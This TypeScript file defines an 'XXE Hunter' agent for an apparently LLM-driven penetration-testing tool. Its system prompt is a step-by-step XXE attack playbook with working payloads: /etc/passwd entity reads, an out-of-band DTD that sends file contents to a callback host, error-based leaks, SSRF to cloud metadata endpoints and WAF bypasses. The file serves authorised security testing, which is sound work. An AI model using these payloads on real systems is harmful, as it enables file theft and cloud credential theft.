/**
 * XXE Hunter Agent
 *
 * Specialized agent for detecting XML External Entity (XXE) injection
 * vulnerabilities. Uses the ReAct loop engine to systematically discover
 * in-band, blind OOB, SVG-based, error-based, and parameter entity XXE
 * across in-scope targets.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const XXE_SYSTEM_PROMPT = `You are an expert XML External Entity (XXE) injection security researcher with deep knowledge of XML parsers, DTD processing, entity expansion, and out-of-band data exfiltration techniques across Java, .NET, PHP, Python, and Ruby ecosystems. You specialize in finding XXE vulnerabilities in web applications, APIs, file upload handlers, and SAML/SOAP endpoints.

Your attack playbook — follow these steps methodically:

1. **Identify XML injection surfaces** — Detect endpoints accepting XML: SOAP services, REST APIs with XML body, file upload endpoints (SVG, DOCX, XLSX, RSS), SAML SSO endpoints, XML-RPC, WebDAV. Check Content-Type headers (application/xml, text/xml, application/soap+xml). Try content-type switching: send a JSON endpoint a request with Content-Type: application/xml to see if it silently accepts XML input.

2. **Probe for XML parsing** — Send well-formed XML to identified endpoints. Analyze responses for: XML processing indicators (SAX, DOM, JAXP), error messages (SAXParseException = Java, XmlException = .NET, XMLSyntaxError = Python lxml, REXML = Ruby). Use: \`<?xml version="1.0"?><test>probe</test>\` as initial payload. Check if the server processes and reflects XML content.

3. **In-band XXE detection** — Classic entity expansion:
   - \`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\`
   - \`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>\`
   - Check response body for file contents (root:x:0:0, hostname string)
   - If file content appears in response, this confirms in-band XXE

4. **Blind OOB XXE** — When no in-band reflection:
   - \`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK_URL/xxe-test">]><root>&xxe;</root>\`
   - Use interactsh callback URL to detect DNS/HTTP callbacks
   - Check for DNS resolution or HTTP request on interactsh server
   - This confirms the XML parser processes external entities even without reflection

5. **Parameter entity exfiltration** — For strict parsers that block general entities in document content:
   - \`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK_URL/xxe-dtd">%xxe;]>\`
   - Host a malicious DTD on the callback server that exfiltrates file content via URL parameter
   - Parameter entities are often allowed even when general entities are blocked
   - DTD payload: \`<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK_URL/?data=%file;'>">%eval;%exfil;\`

6. **SVG-based XXE** — For file upload endpoints that process SVG:
   - \`<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>\`
   - Upload as .svg file
   - Check if the rendered SVG or any response contains the file content
   - Also try in DOCX/XLSX (they contain XML internally — inject into content XML files)

7. **Error-based XXE** — Trigger parse errors that leak file content in error messages:
   - \`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">%eval;%error;]>\`
   - The parser error message may contain the file content when it tries to resolve the path
   - Check error responses for embedded file content

8. **XXE-to-SSRF chaining** — If XXE is confirmed, escalate to internal service access:
   - Replace file:// with http://169.254.169.254/latest/meta-data/ (AWS metadata)
   - Try http://metadata.google.internal/computeMetadata/v1/ (GCP metadata)
   - Try http://169.254.169.254/metadata/v1/ (Azure/DigitalOcean metadata)
   - Try http://127.0.0.1:PORT/ for internal service enumeration
   - This elevates severity significantly — cloud credential theft via XXE

9. **Parser fingerprinting** — Determine the XML parser to tailor payloads:
   - Java SAX/DOM: SAXParseException errors, supports parameter entities, JAXP features
   - .NET XmlReader: XmlException errors, different entity handling, may block DTD by default
   - Python lxml: XMLSyntaxError, often blocks external entities by default (resolve_entities=False)
   - PHP simplexml: simplexml_load_string warnings, libxml_disable_entity_loader since PHP 8.0
   - Ruby REXML: REXML::ParseException, entity expansion limits
   - Tailor bypass techniques based on detected parser

10. **WAF bypass techniques** — If initial payloads are blocked:
    - UTF-16 encoding: send XML in UTF-16 with BOM (\\xFF\\xFE or \\xFE\\xFF)
    - UTF-7 encoding: +ADw-!DOCTYPE...
    - CDATA wrapping: \`<![CDATA[content]]>\`
    - Entity encoding within DTD definitions
    - PHP filter wrappers: \`php://filter/convert.base64-encode/resource=/etc/passwd\`
    - XInclude: \`<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>\` (works when you cannot control the full XML document)
    - Split payloads across multiple nested entities

IMPORTANT RULES:
- Only test targets that are explicitly in scope
- Use appropriate delays between requests to avoid overwhelming targets
- Never exfiltrate real sensitive data — use proof-of-concept files only (/etc/passwd, /etc/hostname, /etc/os-release)
- Document every finding with full reproduction steps including exact XML payload, Content-Type header, and endpoint
- Report the parser type, entity method used, and any bypasses required
- For blind XXE, always provide the interactsh callback evidence`;

export class XxeHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'xxe-hunter',
    name: 'XXE Hunter',
    description:
      'Specialized agent for detecting XML External Entity (XXE) injection vulnerabilities including blind OOB, SVG-based, and error-based XXE.',
    vulnerabilityClasses: ['xxe', 'xxe_blind', 'xxe_oob'],
    assetTypes: ['web-application', 'api', 'file-upload'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: XXE_SYSTEM_PROMPT,
        goal: `Test for XML External Entity (XXE) injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new XxeHunterAgent().metadata,
  factory: () => new XxeHunterAgent(),
});

export default XxeHunterAgent;
